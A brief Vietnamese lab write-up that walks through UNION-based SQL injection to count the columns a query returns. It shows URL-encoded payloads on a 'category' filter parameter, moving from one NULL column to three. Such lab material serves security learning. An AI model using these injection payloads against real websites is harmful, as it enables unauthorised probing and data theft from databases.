Helu các bạn @@
++ Chủ đề lần này của chúng ta sẽ là Tấn công UNION chèn SQL , xác định số cột được truy vấn trả về
thì nó còn dễ hơn mấy lab kia nhiều ấy
Thực ra nó chỉ muốn biết là có mấy column query ta thôi
Let 's go : 
                                        filter?category=Pets%27%20UNION%20SELECT%20NULL%20--
response sever là 500 vậy là nhiều hơn 1 cột tiếp tục thử cho đến khi 3 column:
                                        filter?category=Pets%27%20UNION%20SELECT%20NULL,NULL,NULL%20--
đã trả ra vậy thôi @@ 
 chúc các bạn thành công : Author : l3mh0cr3d